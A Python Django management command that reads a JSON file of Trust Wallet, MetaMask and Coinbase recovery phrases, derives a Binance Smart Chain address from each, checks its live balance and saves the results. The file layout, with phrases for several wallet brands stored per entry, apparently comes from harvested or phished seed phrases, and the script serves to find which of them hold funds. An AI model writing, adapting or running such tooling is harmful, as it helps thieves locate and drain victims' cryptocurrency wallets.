# myapp/management/commands/generate_bnb_addresses.py

import json
from mnemonic import Mnemonic
from bip_utils import Bip39SeedGenerator, Bip44, Bip44Coins, Bip44Changes
from web3 import Web3
from django.core.management.base import BaseCommand

class Command(BaseCommand):
    help = 'Generate BNB addresses from mnemonic phrases, check balances, and update data.json'

    def handle(self, *args, **kwargs):
        input_file = './p.json'
        output_file = './p_updated.json'
        bsc_url = 'https://bsc-dataseed1.defibit.io/'  # Binance Smart Chain Mainnet URL
        self.w3 = Web3(Web3.HTTPProvider(bsc_url))

        if not self.w3.is_connected():
            self.stdout.write(self.style.ERROR("Unable to connect to Binance Smart Chain."))
            return

        self.generate_and_check_balances(input_file, output_file)
        self.stdout.write(self.style.SUCCESS(f"BNB addresses generated, balances checked, and saved to {output_file}"))

    def generate_and_check_balances(self, input_file, output_file):
        with open(input_file, 'r') as f:
            data = json.load(f)

        updated_data = {}

        for key, value in data.items():
            if 'Trust Wallet Pass Phrase' in value or 'Coinbase Pass Phrase' in value or 'MetaMask Pass Phrase' in value:
                if 'Trust Wallet Pass Phrase' in value:
                    passphrase = value['Trust Wallet Pass Phrase']['value']
                elif 'MetaMask Pass Phrase' in value:
                    passphrase = value['MetaMask Pass Phrase']['value']
                else:
                    passphrase = value['Coinbase Pass Phrase']['value']
                    
                bnb_address = self.generate_bnb_address(passphrase)
                balance = self.check_balance(bnb_address)
                value['BNB Address'] = bnb_address
                value['BNB Balance'] = str(balance)
                print(key, balance, bnb_address)
            updated_data[key] = value

        with open(output_file, 'w') as f:
            json.dump(updated_data, f, indent=4)

    def generate_bnb_address(self, passphrase):
        # Initialize Mnemonic and generate seed
        mnemonic = Mnemonic("english")
        seed = mnemonic.to_seed(passphrase)

        # Generate BNB address using BIP44
        bip44_mst_ctx = Bip44.FromSeed(seed, Bip44Coins.BINANCE_SMART_CHAIN)
        bip44_acc_ctx = bip44_mst_ctx.Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT)
        bip44_addr_ctx = bip44_acc_ctx.AddressIndex(0)

        # Return the BNB address (same format as Ethereum)
        return bip44_addr_ctx.PublicKey().ToAddress()

    def check_balance(self, address):
        # Get the balance of the BNB address
        try:
            balance_wei = self.w3.eth.get_balance(address)
            balance_bnb = self.w3.from_wei(balance_wei, 'ether')
            return balance_bnb
        except Exception as e:
            self.stdout.write(self.style.ERROR(f"Error fetching balance for {address}: {str(e)}"))
            return 0.0
